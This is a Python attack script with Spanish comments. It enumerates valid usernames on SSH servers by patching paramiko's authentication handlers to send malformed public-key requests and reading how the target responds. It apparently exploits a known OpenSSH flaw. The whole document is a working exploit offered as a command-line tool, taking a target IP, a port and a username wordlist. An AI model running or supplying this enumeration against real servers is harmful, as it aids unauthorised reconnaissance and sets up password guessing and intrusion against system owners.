#!/usr/bin/env python3

import argparse, paramiko, socket, sys, os
from colorama import Fore, Style  # Para colores y estilos en la consola

class InvalidUsername(Exception):
    pass

# Función maliciosa para manipular el paquete
def add_boolean(*args, **kwargs):
    pass

# Sobrescribir el manejador de MSG_SERVICE_ACCEPT
def service_accept(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result = old_service_accept(*args, **kwargs)
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# Manejador para usuarios inválidos
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# Obtener y modificar la tabla de manejadores
auth_handler = paramiko.auth_handler.AuthHandler
handler_table = auth_handler._client_handler_table.fget(auth_handler)  # Acceso correcto a la propiedad
old_service_accept = handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# Asignar los manejadores personalizados
handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# Imprimir los usuarios válidos encontrados
def print_result(valid_users):
    if valid_users:
        print(f"{Fore.GREEN}Usuarios válidos:{Style.RESET_ALL}")
        for user in valid_users:
            print(f"{Fore.GREEN}{user}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No se encontraron usuarios válidos.{Style.RESET_ALL}")

# Intentar autenticación con el usuario proporcionado
def check_user(username):
    try:
        sock = socket.socket()
        sock.connect((args.target, int(args.port)))
        transport = paramiko.transport.Transport(sock)
        transport.start_client(timeout=0.5)

    except paramiko.ssh_exception.SSHException:
        print(f'{Fore.RED}[!] Fallo al negociar el transporte SSH{Style.RESET_ALL}')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"{Fore.GREEN}[+] {username} es un usuario válido{Style.RESET_ALL}")
        return True
    except:
        print(f"{Fore.RED}[-] {username} es un usuario inválido{Style.RESET_ALL}")
        return False

# Verificar una lista de usuarios desde un archivo de texto
def check_userlist(wordlist_path):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.strip()
                try:
                    if check_user(username):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("Enumeración abortada por el usuario.")
                    break

        print_result(valid_users)
    else:
        print(f"{Fore.RED}El archivo {wordlist_path} no es válido.{Style.RESET_ALL}")
        sys.exit(2)

# Deshabilitar los logs de Paramiko
paramiko.util.log_to_file('/dev/null')

# Configuración de los argumentos del script
parser = argparse.ArgumentParser(description='Enumeración de Usuarios SSH por Leap Security (@LeapSecurity)')
parser.add_argument('target', help="Dirección IP del sistema objetivo")
parser.add_argument('-p', '--port', default=22, help="Puerto del servicio SSH")
parser.add_argument('-u', '--user', dest='username', help="Nombre de usuario a verificar")
parser.add_argument('-w', '--wordlist', dest='wordlist', help="Archivo con lista de usuarios")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

# Ejecutar según los argumentos proporcionados
if args.wordlist:
    check_userlist(args.wordlist)
elif args.username:
    check_user(args.username)
else:
    print("[-] Debe especificar un nombre de usuario o una lista de usuarios.\n")
    parser.print_help()
    sys.exit(1)
